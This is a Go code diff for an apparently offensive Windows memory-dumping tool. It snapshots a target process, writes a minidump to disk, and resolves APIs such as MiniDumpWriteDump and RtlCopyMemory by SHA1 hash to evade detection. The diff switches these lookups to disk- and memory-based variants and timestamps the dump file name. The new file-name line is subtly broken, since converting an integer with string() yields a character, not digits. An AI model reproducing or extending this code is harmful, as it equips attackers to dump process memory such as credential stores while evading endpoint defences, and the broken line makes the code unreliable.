@@ -12,6 +12,7 @@ import (
 	"os"
 	"strconv"
 	"syscall"
+	"time"
 	"unsafe"
 
 	wins "github.com/cloudfoundry/gosigar/sys/windows"
@@ -152,7 +153,7 @@ func main() {
 	dump, _ := minidump(uint32(pid), windows.Handle(currentSnapshotProcess))
 
 	if dump != nil {
-		ioutil.WriteFile("dumpfile.dmp", dump, 0644)
+		ioutil.WriteFile(string(time.Now().UnixMilli())+".dmp", dump, 0644)
 	}
 
 	syscall.Syscall(uintptr(ZwClose), 1, currentSnapshotProcess, 0, 0)
@@ -193,7 +194,7 @@ func minidump(pid uint32, proc windows.Handle) ([]byte, error) {
 	procMemCounters := ProcessMemoryCounters{}
 	sizeOfMemCounters := uint32(unsafe.Sizeof(procMemCounters))
 
-	GetProcessMemoryInfo, _, _ := gabh.GetFuncPtr("psapi.dll", "730673ace5e3cc0e4be126de2ec956c68a9d03d4", str2sha1)
+	GetProcessMemoryInfo, _, _ := gabh.DiskFuncPtr("psapi.dll", "730673ace5e3cc0e4be126de2ec956c68a9d03d4", str2sha1)
 	r, _, _ := syscall.Syscall(uintptr(GetProcessMemoryInfo), 3, uintptr(proc), uintptr(unsafe.Pointer(&procMemCounters)), uintptr(sizeOfMemCounters))
 	if r == 0 {
 		// {{if .Config.Debug}}
@@ -216,7 +217,7 @@ func minidump(pid uint32, proc windows.Handle) ([]byte, error) {
 		CallbackRoutine: windows.NewCallback(minidumpCallback),
 		CallbackParam:   uintptr(unsafe.Pointer(&outData)),
 	}
-	MiniDumpWriteDump, _, e := gabh.GetFuncPtr("dbgcore.dll", "6fd11841d7f7c5514490f6079ab1c51c3162c477", str2sha1)
+	MiniDumpWriteDump, _, e := gabh.DiskFuncPtr("dbgcore.dll", "6fd11841d7f7c5514490f6079ab1c51c3162c477", str2sha1)
 
 	if e != nil {
 		panic(e)
@@ -277,7 +278,7 @@ func getCallbackInput(callbackInputPtr uintptr) (*MiniDumpCallbackInput, error) 
 	data := make([]byte, bufferSize)
 	dataPtr := uintptr(unsafe.Pointer(&data[0]))
 
-	RtlCopyMemory, _, _ := gabh.GetFuncPtr("kernel32.dll", "638f1a50566e7a2aceaeeebc63980672611c32a0", str2sha1)
+	RtlCopyMemory, _, _ := gabh.MemFuncPtr("kernel32.dll", "638f1a50566e7a2aceaeeebc63980672611c32a0", str2sha1)
 
 	syscall.Syscall(uintptr(RtlCopyMemory), 3, dataPtr, callbackInputPtr, uintptr(bufferSize))
 	buffReader := bytes.NewReader(data)
@@ -405,7 +406,7 @@ func minidumpCallback(callbackParam uintptr, callbackInputPtr uintptr, callbackO
 		}
 		destination := outData.outPtr + uintptr(callbackInput.Io.Offset)
 
-		RtlCopyMemory, _, _ := gabh.GetFuncPtr("kernel32.dll", "638f1a50566e7a2aceaeeebc63980672611c32a0", str2sha1)
+		RtlCopyMemory, _, _ := gabh.MemFuncPtr("kernel32.dll", "638f1a50566e7a2aceaeeebc63980672611c32a0", str2sha1)
 
 		syscall.Syscall(uintptr(RtlCopyMemory), 3, destination, callbackInput.Io.Buffer, uintptr(callbackInput.Io.BufferBytes))
 
